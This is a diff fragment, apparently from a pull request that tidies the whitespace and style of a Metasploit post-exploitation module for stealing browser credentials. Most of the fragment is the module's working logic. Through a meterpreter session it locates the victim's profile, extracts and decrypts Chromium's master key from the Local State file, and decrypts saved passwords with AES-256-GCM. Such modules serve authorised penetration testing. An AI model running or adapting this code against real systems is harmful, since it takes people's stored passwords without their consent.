@@ -43,23 +43,22 @@ class MetasploitModule < Msf::Post
       print_error('This module requires a meterpreter session.')
       return
     end
-  
+
     user_profile = get_env('USERPROFILE')
     user_account = session.sys.config.getuid
     ip_address = session.sock.peerhost
-  
+
     if user_profile.nil? || user_profile.empty?
       print_error('Could not determine the current user profile directory.')
       return
     end
-  
+
     print_status("Targeting: #{user_account} (#{ip_address}).")
     print_status("Starting data extraction from user profile: #{user_profile}")
-  
+
     process_chromium_browsers(user_profile)
     process_gecko_browsers(user_profile)
   end
-  
 
   # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
   def process_chromium_browsers(base_path)
@@ -192,7 +191,7 @@ class MetasploitModule < Msf::Post
 
   def get_encryption_key(local_state_path)
     print_status("Getting encryption key from: #{local_state_path}") if datastore['VERBOSE']
-  
+
     if file?(local_state_path)
       local_state = read_file(local_state_path)
       json_state = begin
@@ -200,12 +199,12 @@ class MetasploitModule < Msf::Post
       rescue StandardError
         nil
       end
-  
+
       if json_state.nil?
         print_error('Failed to parse JSON from Local State file.')
         return nil
       end
-  
+
       if json_state['os_crypt'] && json_state['os_crypt']['encrypted_key']
         encrypted_key = json_state['os_crypt']['encrypted_key']
         encrypted_key_bin = begin
@@ -213,19 +212,19 @@ class MetasploitModule < Msf::Post
         rescue StandardError
           nil
         end
-  
+
         if encrypted_key_bin.nil?
           print_error('Failed to Base64 decode the encrypted key.')
           return nil
         end
-  
+
         print_status("Encrypted key (Base64-decoded, hex): #{encrypted_key_bin.unpack('H*').first}") if datastore['VERBOSE']
-        
+
         decrypted_key = decrypt_data(encrypted_key_bin)
-  
+
         if decrypted_key.nil? || decrypted_key.length != 32
           print_error("Decrypted key is not 32 bytes: #{decrypted_key.nil? ? 'nil' : decrypted_key.length} bytes") if datastore['VERBOSE']
-          
+
           if decrypted_key.length == 31
             print_status('Decrypted key is 31 bytes, attempting to pad key for decryption.') if datastore['VERBOSE']
             decrypted_key += "\x00"
@@ -233,7 +232,7 @@ class MetasploitModule < Msf::Post
             return nil
           end
         end
-  
+
         print_good("Decrypted key (hex): #{decrypted_key.unpack('H*').first}") if datastore['VERBOSE']
         return decrypted_key
       else
@@ -244,7 +243,7 @@ class MetasploitModule < Msf::Post
       print_error("Local State file not found at: #{local_state_path}")
       return nil
     end
-  end  
+  end
 
   def decrypt_chromium_password(encrypted_password, key)
     # Check for the "v20" prefix that indicates App-Bound encryption, which can't be decrypted yet.
@@ -253,33 +252,32 @@ class MetasploitModule < Msf::Post
       print_status('App-Bound encryption detected (v20). Skipping decryption for this entry.') if datastore['VERBOSE']
       return nil
     end
-  
+
     return print_error('Invalid encrypted password length.') if encrypted_password.nil? || encrypted_password.length < (IV_SIZE + TAG_SIZE)
-  
+
     iv = encrypted_password[3, IV_SIZE]
     ciphertext = encrypted_password[IV_SIZE + 3...-TAG_SIZE]
     tag = encrypted_password[-TAG_SIZE..]
-  
+
     if iv.nil? || iv.length != IV_SIZE
       print_error("Invalid IV: expected #{IV_SIZE} bytes, got #{iv.nil? ? 'nil' : iv.length} bytes")
       return nil
     end
-  
+
     begin
       aes = OpenSSL::Cipher.new('aes-256-gcm')
       aes.decrypt
       aes.key = key
       aes.iv = iv
       aes.auth_tag = tag
-  
+
       decrypted_password = aes.update(ciphertext) + aes.final
       return decrypted_password
-    rescue OpenSSL::Cipher::CipherError => e
-      print_status("Password decryption failed for this entry.") if datastore['VERBOSE']
+    rescue OpenSSL::Cipher::CipherError
+      print_status('Password decryption failed for this entry.') if datastore['VERBOSE']
       return nil
     end
   end
-  
 
   def extract_chromium_data(profile_path, encryption_key, browser)
     return print_error("Profile path #{profile_path} not found.") unless directory?(profile_path)
